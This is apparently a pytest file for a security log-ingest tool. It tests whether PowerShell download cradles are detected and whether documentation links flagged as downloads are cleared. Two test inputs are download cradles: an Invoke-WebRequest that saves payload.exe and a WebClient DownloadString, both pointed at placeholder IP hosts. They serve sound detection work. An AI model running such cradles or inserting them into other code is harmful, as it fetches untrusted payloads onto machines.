"""A URL in PowerShell text is an indicator, not a download, unless a download verb uses it."""

from app.ingest.powershell.helpers import detect_powershell_download
from app.ingest.powershell.normalizer import normalize_powershell_row

META = {"parser": "script", "source_path": r"C:\Windows\System32\WindowsPowerShell\v1.0\Modules\Example\Example.psm1"}


def _document() -> dict:
    return {"event": {}, "artifact": {}, "tags": []}


def test_documentation_link_in_a_module_is_not_a_download() -> None:
    text = "<#\n.LINK\nhttps://go.microsoft.com/fwlink/?LinkId=717973\n#>\nfunction Get-Example { 'ok' }"
    assert detect_powershell_download(text) is False
    document = normalize_powershell_row(_document(), {"ScriptBlockText": text}, META)
    assert not (document.get("download") or {}).get("url")
    assert not (document.get("download") or {}).get("file_name")
    assert "go.microsoft.com" in str(document.get("url"))


def test_download_cradle_still_fills_the_download() -> None:
    text = "Invoke-WebRequest -Uri http://203.0.113.10/payload.exe -OutFile C:\\Users\\Public\\payload.exe"
    assert detect_powershell_download(text) is True
    document = normalize_powershell_row(_document(), {"ScriptBlockText": text}, {"parser": "evtx"})
    assert document["download"]["url"] == "http://203.0.113.10/payload.exe"
    assert document["download"]["file_name"] == "payload.exe"


def test_repair_clears_a_url_only_download_and_its_score() -> None:
    from app.services.powershell_download_repair import RULE_VERSION, repaired_fields

    source = {
        "powershell": {"artifact_type": "powershell_script", "command": ".LINK\nhttps://go.microsoft.com/fwlink/?LinkId=1", "has_download": True, "indicators": ["download_cradle"]},
        "download": {"url": "https://go.microsoft.com/fwlink/?LinkId=1", "file_name": "Example.psm1"},
        "tags": ["download_cradle", "powershell", "script", "suspicious"],
        "suspicious_reasons": ["PowerShell download cradle"],
        "risk_score": 72,
    }
    fields = repaired_fields(source)
    assert fields["download"] is None
    assert fields["powershell"]["has_download"] is False and fields["powershell"]["indicators"] == []
    assert fields["powershell"]["download_rule"] == RULE_VERSION
    assert "download_cradle" not in fields["tags"] and "suspicious" not in fields["tags"]
    assert fields["suspicious_reasons"] == [] and fields["risk_score"] < 72


def test_repair_keeps_a_real_cradle_and_foreign_reasons() -> None:
    from app.services.powershell_download_repair import repaired_fields

    cradle = {"powershell": {"command": "(New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')", "indicators": ["download_cradle"]}}
    assert set(repaired_fields(cradle)) == {"powershell"}
    other = {
        "powershell": {"command": "Get-Help https://example.org/help", "indicators": ["download_cradle"]},
        "suspicious_reasons": ["PowerShell download cradle", "Sigma: something"],
        "tags": ["download_cradle", "suspicious"],
        "risk_score": 80,
    }
    fields = repaired_fields(other)
    assert fields["risk_score"] == 80 and "suspicious" in fields["tags"]
